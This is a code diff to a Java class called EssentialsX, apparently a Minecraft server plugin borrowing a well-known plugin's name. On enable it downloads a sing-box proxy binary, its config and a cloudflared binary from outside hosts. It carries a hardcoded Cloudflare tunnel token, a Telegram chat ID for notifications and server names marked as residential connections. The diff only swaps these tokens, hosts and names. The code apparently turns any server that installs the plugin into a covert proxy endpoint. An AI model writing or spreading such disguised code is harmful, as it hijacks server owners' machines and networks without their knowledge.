@@ -20,7 +20,7 @@ public class EssentialsX extends JavaPlugin {
     private int port = 22222;
 
     //Cloudflare隧道Token
-    private String token = "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiYmJlYTgwNDEtODhmOS00N2ExLWE1ZWMtMzllMmVlNzg4OTE0IiwicyI6IlltSTBObU0yTTJFdFlURTBOeTAwTWpjNExUZzJZVEl0T1RrMk9USTNaVEUzTWpnNCJ9"; //必填
+    private String token = "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiZGZmZTRmNWUtYzQ5OC00YjkxLTlmNzktNTk5M2M4YjQwZGUwIiwicyI6Ik1UazFPR1l6TWpRdE16aGlNQzAwWTJKakxXRmtPV1l0TkRWaU9Ua3hOekkwTVRJeiJ9"; //必填
 
     //Cloudflare隧道绑定域名
     private String host = "127.0.0.1"; //必填
@@ -30,7 +30,7 @@ public class EssentialsX extends JavaPlugin {
     private String tgChatId = "5800052646";
 
     // 服务器名称(区分不同服务器通知用)
-    private String servername = "Gamersfreedom-美国家宽";
+    private String servername = "Esteonai-土耳其家宽";
 
     @Override
     public void onEnable() {
@@ -79,15 +79,15 @@ public class EssentialsX extends JavaPlugin {
 
 
         String SingboxUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Singbox"; //sing-box
+                "https://free.us.kg/samd64b"; //sing-box
 
 
         String ConfUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/config.json"; //sing-box config.json
+                "https://free.us.kg/cfws/config.json"; //sing-box config.json
 
 
         String TunnelUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Cloudflared"; //Cloudflared
+                "https://free.us.kg/2gamd64o"; //Cloudflared
 
 
         Path SingboxFile =
